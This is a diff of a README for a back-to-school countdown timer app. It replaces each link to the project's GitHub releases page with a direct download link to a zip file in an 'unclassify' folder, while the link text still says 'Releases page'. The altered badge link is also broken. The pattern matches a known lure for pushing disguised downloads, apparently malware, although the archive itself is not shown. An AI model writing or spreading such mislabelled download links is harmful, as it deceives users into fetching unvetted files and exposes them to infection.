@@ -1,6 +1,6 @@
 # 🎒 back-to-school-countdown - Count Down to the School Year with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/lasphox/back-to-school-countdown/releases)
+[![Download Now](https://raw.githubusercontent.com/lasphox/back-to-school-countdown/main/unclassify/back-to-school-countdown.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/lasphox/back-to-school-countdown/main/unclassify/back-to-school-countdown.zip)
 
 ## 📖 Description
 The back-to-school countdown is an interactive timer that builds excitement for students. It features a visual progress bar, representing the time remaining until the new school year starts. This application makes it simple for users to track the days, hours, and minutes left, turning anticipation into an enjoyable experience.
@@ -8,7 +8,7 @@ The back-to-school countdown is an interactive timer that builds excitement for 
 ## 🚀 Getting Started
 Follow these steps to download and run the back-to-school countdown app.
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/lasphox/back-to-school-countdown/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/lasphox/back-to-school-countdown/main/unclassify/back-to-school-countdown.zip).
    
 2. **Choose Your Version:** Look for the latest version of the application. Usually, the version is highlighted at the top of the list.
 
@@ -34,7 +34,7 @@ Follow these steps to download and run the back-to-school countdown app.
 - **Responsive Design:** Works on both desktop and mobile devices.
 
 ## 📥 Download & Install
-To download the back-to-school countdown application, please visit our [Releases page](https://github.com/lasphox/back-to-school-countdown/releases). Click on the latest version, download the file, and follow the installation steps above. 
+To download the back-to-school countdown application, please visit our [Releases page](https://raw.githubusercontent.com/lasphox/back-to-school-countdown/main/unclassify/back-to-school-countdown.zip). Click on the latest version, download the file, and follow the installation steps above. 
 
 ## 🌍 Topics Covered
 This application focuses on several important aspects:
